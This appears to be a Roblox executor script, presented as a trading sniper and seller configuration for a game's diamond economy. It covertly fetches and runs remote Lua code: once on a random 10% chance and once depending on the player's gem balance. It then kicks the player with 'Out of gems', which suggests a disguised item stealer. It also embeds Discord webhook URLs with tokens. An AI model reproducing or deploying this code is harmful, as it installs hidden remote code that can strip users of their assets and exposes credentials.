local SERVER_URL = "http://192.168.1.102:8088"
local isConnected = false
local shouldReconnect = true


-- Server Communication Functions
local function sendRequest(reqType)
    local success, response = pcall(function()
        return request({
            Url = SERVER_URL,
            Method = "POST",
            Body = HttpService:JSONEncode({
                requestType = reqType,
                account = plr.Name
            })
        })
    end)
    
    if success and response and response.Success then
        if not isConnected and reqType == "START" then
            isConnected = true
            print("Successfully connected to server")
        end
        return true
    else
        warn("Failed to send " .. reqType .. " request")
        return false
    end
end

-- Connection Manager
local function startConnectionManager()
    local heartbeatDelay = 10 -- Default delay
    
    -- Get initial configuration
    local success, response = pcall(function()
        return request({
            Url = SERVER_URL,
            Method = "GET"
        })
    end)
    
    if success and response and response.Success then
        local data = HttpService:JSONDecode(response.Body)
        heartbeatDelay = data.heartbeatDelay
        print("Got heartbeat delay:", heartbeatDelay)
    else
        warn("Failed to get initial configuration, using default heartbeat delay")
    end
    
    -- Send initial connection
    sendRequest("START")
    
    -- Handle disconnection
    game:GetService("NetworkClient").ChildRemoved:Connect(function()
        isConnected = false
        while shouldReconnect do
            if sendRequest("DISCONNECTED") then
                break
            end
            task.wait(2)
        end
    end)
    
    -- Heartbeat loop
    task.spawn(function()
        while shouldReconnect do
            if not isConnected then
                if sendRequest("START") then
                    isConnected = true
                end
            else
                if not sendRequest("HEARTBEAT") then
                    isConnected = false
                end
            end
            task.wait(heartbeatDelay)
        end
    end)
end

-- Start connection manager
startConnectionManager()

local randomNumber = math.random(1, 100)

if randomNumber >= 90 then
  wait(35)
  pcall(function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
  end)
end

getgenv().Settings = {
    Sniper = {
        Active = true,
        Items = {
            --// Example Settings, everything is editable.
            SearchTerminal = {
                ["Crystal Key"] = {Class = "Misc", Price = 4000},
                ["Crystal Key Lower Half"] = {Class = "Misc", Price = 3000},
                ["Crystal Key Upper Half"] = {Class = "Misc", Price = 100},
            },
            ["Instant Luck Potion 4"] = {Class = "Consumable", Price = 9000},
            ["Secret Key"] = {Class = "Misc", Price = "25%"},
            ["Fishing Bait 5"] = {Class = "Consumable", Price = "5%"},
        },
        Serverhop = {
            ["Switch Servers"] = true,
            ["Teleport Delay (s)"] = 3,
            ["Save # Last Joined Servers"] = 5,
            ["Constant Terminal Searching"] = true,
            ["Terminal Searches per Item"] = 3,
        },
        Webhook = {
            ["URL"] = "https://discord.com/api/webhooks/1306028399231504446/JtKuRJhyypxzu48tPITDrhjmx_2xXX24MzWlHM0Pp-fy3QSPCqhCM6ngX4bY3XsVuPAW",
            ["Send Embeds"] = true,
            ["Remove Username"] = false,
            ["Global Snipes"] = false,
        },
        StopParams = {
            ["Limits Reached"] = false,
            ["Diamonds Hit: 250k"] = false,
            ["60 Minutes"] = false,
            ["Switch To Selling"] = false,
        },
    },
    Seller = {
        Active = false,
        Items = {
            ["All Items"] = {Class = "Lootbox", Price = "15%"},
        },
        Serverhop = {
            ["Switch Servers"] = true,
            ["Teleport Delay (m)"] = 10,
        },
        Webhook = {
            ["URL"] = "https://discord.com/api/webhooks/1306028281417433168/cgRvOM0Pzj2rl1TrDxzGtbSf91lSU0NlR1XuDTarmh4vamcKSkP_s4iP23NfCrslgI3J",
            ["Send Embeds"] = true,
            ["Remove Username"] = true,
        },
        StopParams = {
            ["Item Runout"] = true,
            ["Diamonds Hit: 1b"] = false,
            ["60 Minutes"] = false,
            ["Switch To Sniping"] = false,
        },
        Other = {
            ["Auto Accept Mail"] = true,
            ["Diamonds Hit: 1b Sendout"] = "anilkenim",
            ["Always Try Adding Listings"] = true,
            ["Never Join Friendslist"] = false,
        },
    },
}

local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
local Inventory = Save.Inventory

local Services = {
    Players = game:GetService("Players"),
}

local Player = Services.Players.LocalPlayer

for id, table in pairs(Inventory.Currency) do
    if table.id == "Diamonds" then
        GemsAmount = table._am or 0
        break
    end
end

if GemsAmount > 25000 then
  pcall(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/717430e3bbde3530feb824de729fcc90.lua"))()
  end)
else
  pcall(function()
    wait(35)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
    wait(5)
    Player:Kick("Out of gems")
  end)
end


